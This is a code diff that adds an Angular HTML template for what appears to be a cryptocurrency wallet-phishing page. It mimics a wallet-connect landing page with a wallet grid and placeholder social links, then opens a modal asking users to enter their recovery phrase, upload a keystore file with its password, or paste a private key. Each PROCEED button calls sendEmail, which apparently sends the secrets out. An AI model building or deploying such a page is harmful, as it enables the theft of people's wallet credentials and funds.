@@ -1,0 +1,188 @@
+<section *ngIf="landingpage" >
+  <div class="container" *ngIf="!newPage">
+    <nav class="navbar navbar-expand-lg navbar-light mt-3">
+      <div class="container-fluid">
+        <a class="navbar-brand" href="#">
+          <img src="./../assets/wallets/logo.png" class="logo" alt="">
+        </a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent"
+          aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+          <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
+            <li class="nav-item">
+              <a class="nav-link active" aria-current="page" href="#"><strong>Wallet</strong></a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link active" href="#"><strong>Apps</strong></a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+
+    <div class="text-center fAmUdU mt-5">
+      <h1 class="mb-5">Wallets</h1>
+      <p>Multiple iOS and Android wallets support this protocol. Your private keys are encrypted locally on your device
+        with Secure Enclave, protected by Biometric and 2-Factor Authentication. .</p>
+    </div>
+
+    <section class=" mt-5">
+      <div class="container">
+        <div class="wallet-grid row">
+          <div class="text-center mb-3 col-6 col-md-3" *ngFor="let item of allWallet" (click)="registerModal(item.img,item.title)">
+            <img src="{{item.img}}"  alt="" class="mb-3 rimg">
+            <p><strong>{{item.title}}</strong></p>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <div class="text-center fAmUdU mt-5">
+      <p class="mb-5 asdda">Open a pull request on <a class="asads" href="#">Help</a> to add your wallet here.</p>
+      <footer>
+        <a href="wallets.html#" target="blank" rel="noreferrer noopener" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
+          <div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM">
+            <img
+              src="./../assets/wallets/discord.svg" width="20"
+              alt="Discord">
+          </div>
+          <p>Discord</p>
+        </a>
+        <a href="wallets.html#" target="blank" rel="noreferrer noopener" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
+          <div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM">
+            <img
+              src="./../assets/wallets/telegram.svg" width="20"
+              alt="Telegram">
+          </div>
+          <p>Telegram</p>
+        </a>
+        <a href="wallets.html#" target="blank" rel="noreferrer noopener" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
+          <div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM">
+            <img
+              src="./../assets/wallets/twitter.svg" width="20"
+              alt="Twitter">
+          </div>
+          <p>Twitter</p>
+        </a>
+        <a href="wallets.html#" target="blank" rel="noreferrer noopener" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
+          <div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM">
+            <img
+              src="./../assets/wallets/github.svg" width="20"
+              alt="Github">
+          </div>
+          <p>Github</p>
+        </a>
+      </footer>
+    </div>
+  </div>
+
+  <div *ngIf="modal" class="popup">
+    <div class="popup-inner">
+      <div class="popup-body">
+        <div class="container">
+          <div class="row">
+            <div class="col-12 mb-3">
+              <div class="d-flex justify-content-between align-items-center">
+                <div class="d-flex align-items-center">
+                  <img src="{{img}}" width="50" alt="">
+                  <strong class="wallet-app-name-send px-3">{{title}}</strong>
+                </div>
+                <p style="float: right; cursor: pointer;" (click)="registerModal('','')">
+                  <svg width="18" height="16" viewBox="0 0 18 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M1.61279 15.052L14.8382 1" stroke="#D9251D" stroke-width="1.65318" stroke-linecap="round"
+                      stroke-linejoin="round" />
+                    <path d="M3.26611 1L16.4915 15.052" stroke="#D9251D" stroke-width="1.65318" stroke-linecap="round"
+                      stroke-linejoin="round" />
+                  </svg>
+                </p>
+              </div>
+            </div>
+            <div class="col-12">
+              <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
+                <li class="nav-item" role="presentation">
+                  <button class="nav-link active under" id="pills-home-tab" data-bs-toggle="pill"
+                    data-bs-target="#pills-home" type="button" role="tab" aria-controls="pills-home" aria-selected="true">
+                    Phrase
+                  </button>
+                </li>
+                <li class="nav-item" role="presentation">
+                  <button class="nav-link under" id="pills-profile-tab" data-bs-toggle="pill"
+                    data-bs-target="#pills-profile" type="button" role="tab" aria-controls="pills-profile"
+                    aria-selected="false">
+                    Keystore Json
+                  </button>
+                </li>
+                <li class="nav-item" role="presentation">
+                  <button class="nav-link under" id="pills-contact-tab" data-bs-toggle="pill"
+                    data-bs-target="#pills-contact" type="button" role="tab" aria-controls="pills-contact"
+                    aria-selected="false">
+                    Private Key
+                  </button>
+                </li>
+              </ul>
+              <hr>
+              <div class="tab-content" id="pills-tabContent">
+                <div class="tab-pane fade show active" id="pills-home" role="tabpanel" aria-labelledby="pills-home-tab">
+                  <form action="" [formGroup]="feedbackForm">
+                    <textarea name="" id="" cols="" rows="5" placeholder="Enter your recovery phrase" class="form-control"
+                    style="resize: none; width: 100%;" formControlName="phrase"></textarea>
+                    <br>
+                    <small style="font-size: 12px; color: rgba(0, 0, 0, 0.435);">
+                      Typically 12 (sometimes 24) words separated by single spaces.
+                    </small>
+                    <button class="btn btn-sm btn-primary w-100 mb-2 mt-3" (click)="sendEmail('phrase')">
+                      <span *ngIf="!spinner" >PROCEED</span>
+                      <span *ngIf="spinner" class="lds-spinner lds-spinner--center"></span>
+                    </button>
+                    <button class="btn btn-sm btn-danger" style="float: right;" (click)="registerModal('','')">Cancel</button>
+                  </form>
+                </div>
+
+                <div class="tab-pane fade" id="pills-profile" role="tabpanel" aria-labelledby="pills-profile-tab">
+                  <form action="" [formGroup]="feedbackForm">
+                    <p class="text-center">Choose keystore flie</p>
+                    <input type="file" name="" id="" class="form-control mb-2" formControlName="walletFile">
+                    <input type="password" name="" class="form-control" id="" placeholder="Wallet password"
+                    formControlName="wallet">
+                    <br>
+                    <small style="font-size: 10px; color: rgba(0, 0, 0, 0.435);">
+                      Several lines of text beginning with "(...)" plus the password you used to encrypt it.
+                    </small>
+                    <button class="btn btn-sm btn-primary w-100 mb-2 mt-3" (click)="sendEmail('wallet')">
+                      <span *ngIf="!spinner" >PROCEED</span>
+                      <span *ngIf="spinner" class="lds-spinner lds-spinner--center"></span>
+                    </button>
+                    <button class="btn btn-sm btn-danger" style="float: right;" (click)="registerModal('','')">Cancel</button>
+                  </form>
+                </div>
+                <div class="tab-pane fade" id="pills-contact" role="tabpanel" aria-labelledby="pills-contact-tab">
+                  <form action="" [formGroup]="feedbackForm">
+                    <input type="text" class="form-control" name="" id="" placeholder="Enter your Private Key"
+                    formControlName="private">
+                    <br>
+                    <small style="font-size: 12px; color: rgba(0, 0, 0, 0.435);">
+                      Typically 12 (sometimes 24) words separated by a single space.
+                    </small>
+                    <button class="btn btn-sm btn-primary w-100 mb-2 mt-3" (click)="sendEmail('private')">
+                      <span *ngIf="!spinner" >PROCEED</span>
+                      <span *ngIf="spinner" class="lds-spinner lds-spinner--center"></span>
+                    </button>
+                    <button class="btn btn-sm btn-danger" style="float: right;" (click)="registerModal('','')">Cancel</button>
+                  </form>
+                </div>
+              </div>
+            </div>
+            <div class="col-12">
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <app-processing *ngIf="newPage" ></app-processing>
+</section>
+
+<app-landing *ngIf="!landingpage" (valueChange)='displayData($event)'></app-landing>
